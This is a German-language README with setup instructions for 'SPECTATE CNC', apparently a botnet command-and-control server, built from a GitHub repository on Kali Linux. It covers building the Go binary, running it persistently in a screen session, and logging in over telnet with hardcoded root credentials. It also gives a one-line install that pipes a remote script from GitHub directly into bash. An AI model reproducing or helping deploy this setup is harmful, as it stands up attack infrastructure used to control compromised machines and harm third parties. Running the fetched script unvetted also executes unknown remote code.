# SPECTATE CNC

## Speziell für Kali Linux - Schritt-für-Schritt Anleitung

### 1. Vorraussetzungen installieren
Öffne ein Terminal und führe aus:
```bash
sudo apt update
sudo apt install -y golang git
```

### 2. Repository klonen
```bash
cd ~
git clone https://github.com/fear2c/c24u.git
cd c24u/old\ api/cnc
```

### 3. CNC bauen (KEINE Netzwerkprobleme mehr!)
```bash
go build -o spectate-cnc
chmod +x spectate-cnc
```

### 4. CNC starten
Option A: Direkt im Terminal (schließt sich, wenn du das Terminal schließt):
```bash
./spectate-cnc
```

Option B: Im Hintergrund mit `screen` (läuft weiter, auch wenn du das Terminal schließt):
```bash
# Installiere screen, falls noch nicht vorhanden
sudo apt install -y screen

# Starte screen-Sitzung
screen -S spectate-cnc

# Im screen-Terminal CNC starten
./spectate-cnc

# Drücke STRG+A, dann D, um die Sitzung zu verlassen
```

### 5. Verbinden (öffne ein NEUES Terminal!)
```bash
telnet 127.0.0.1 3778
```

### 6. Login-Daten
- **Benutzername**: `root-zero`
- **Passwort**: `root-fear`

---

## Allgemeine Installation (andere Linux-Distro)

### Schnellinstallation
```bash
curl -s https://raw.githubusercontent.com/fear2c/c24u/main/old%20api/install.sh | bash
```

### Manuell
1. Repository klonen
2. Go installieren
3. CNC bauen
4. Ausführen

## Anforderungen
- Linux (Kali/Debian/Ubuntu/CentOS/RHEL)
- Go 1.16+
